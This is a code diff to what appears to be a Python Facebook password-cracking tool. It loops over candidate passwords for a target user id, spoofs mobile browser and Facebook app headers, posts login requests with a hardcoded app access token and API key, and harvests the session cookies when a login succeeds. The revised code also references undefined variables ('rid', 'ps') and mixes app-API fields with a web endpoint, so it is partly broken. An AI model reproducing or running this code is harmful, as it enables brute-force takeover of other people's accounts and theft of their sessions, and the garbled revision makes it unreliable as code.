@@ -140,47 +140,60 @@ class __xxx__:
             for pw in __chi__:
                 pw = pw.lower()
                 session=requests.Session()
-                header = {
-                    "Host":cebok,
-                    "upgrade-insecure-requests":"1",
-                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
-                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                    "dnt":"1",
-                    "x-requested-with":"mark.via.gp",
-                    "sec-fetch-site":"same-origin",
-                    "sec-fetch-mode":"cors",
-                    "sec-fetch-user":"empty",
-                    "sec-fetch-dest":"document",
-                    "referer":"https://m.facebook.com/",
-                    "accept-encoding":"gzip, deflate br",
-                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
-                }
+                header ={'User-Agent': '[FBAN/FB4A;FBAV/72.0.0.2133;FBBV/6966247;[FBAN/FB4A;FBAV/318.0.0.24.109;FBBV/377639763;FBDM/{density=3.06,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Cerillion;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SM-A107F;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Host': 'graph.facebook.com',
+                    'X-FB-Net-HNI': '25227',
+                    'X-FB-SIM-HNI': '29752',
+                    'X-FB-Connection-Type': 'MOBILE.LTE',
+                    'X-Tigon-Is-Retry': 'False',
+                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                    'x-fb-device-group': '5120',
+                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                    'X-FB-Request-Analytics-Tags': 'graphservice',
+                    'X-FB-HTTP-Engine': 'Liger',
+                    'X-FB-Client-IP': 'True',
+                    'X-FB-Server-Cluster': 'True',
+                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+                    'Content-Length': '706'}
                 r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
-                das = {
-                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
-                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
-                    "uid":user,
-                    "flow":"login_no_pin",
-                    "pass":pw,
-                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
-                }
-                header1 = {
-                    "Host":cebok,
-                    "cache-control":"max-age=0",
-                    "upgrade-insecure-requests":"1",
-                    "origin":"https://"+cebok,
-                    "content-type":"application/x-www-form-urlencoded",
-                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
-                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-                    "x-requested-with":"XMLHttpRequest",
-                    "sec-fetch-site":"same-origin",
-                    "sec-fetch-mode":"cors",
-                    "sec-fetch-user":"empty",
-                    "sec-fetch-dest":"document",
-                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
-                    "accept-encoding":"gzip, deflate br",
-                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
-                }
+                das = {"adid": adid,
+                    "format": "json",
+                    "device_id": str(uuid.uuid4()),
+                    "cpl": "true",
+                    "family_device_id": str(uuid.uuid4()),
+                    "credentials_type": "device_based_login_password",
+                    "error_detail_type": "button_with_disabled",
+                    "source": "device_based_login",
+                    "email": rid,
+                    "password": ps,
+                    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+                    "generate_session_cookies": "1",
+                    "meta_inf_fbmeta": "",
+                    "advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
+                    "currently_logged_in_userid": "0",
+                    "locale": "en_GB",
+                    "client_country_code": "GB",
+                    "method": "auth.login",
+                    "fb_api_req_friendly_name": "authenticate",
+                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+                    "api_key": "882a8490361da98702bf97a021ddc14d",}
+                header1 ={'User-Agent': '[FBAN/FB4A;FBAV/72.0.0.2133;FBBV/6966247;[FBAN/FB4A;FBAV/318.0.0.24.109;FBBV/377639763;FBDM/{density=3.06,width=720,height=1600};FBLC/en_US;FBRV/0;FBCR/Cerillion;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SM-A107F;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Host': 'graph.facebook.com',
+                    'X-FB-Net-HNI': '25227',
+                    'X-FB-SIM-HNI': '29752',
+                    'X-FB-Connection-Type': 'MOBILE.LTE',
+                    'X-Tigon-Is-Retry': 'False',
+                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                    'x-fb-device-group': '5120',
+                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                    'X-FB-Request-Analytics-Tags': 'graphservice',
+                    'X-FB-HTTP-Engine': 'Liger',
+                    'X-FB-Client-IP': 'True',
+                    'X-FB-Server-Cluster': 'True',
+                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+                    'Content-Length': '706'}
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
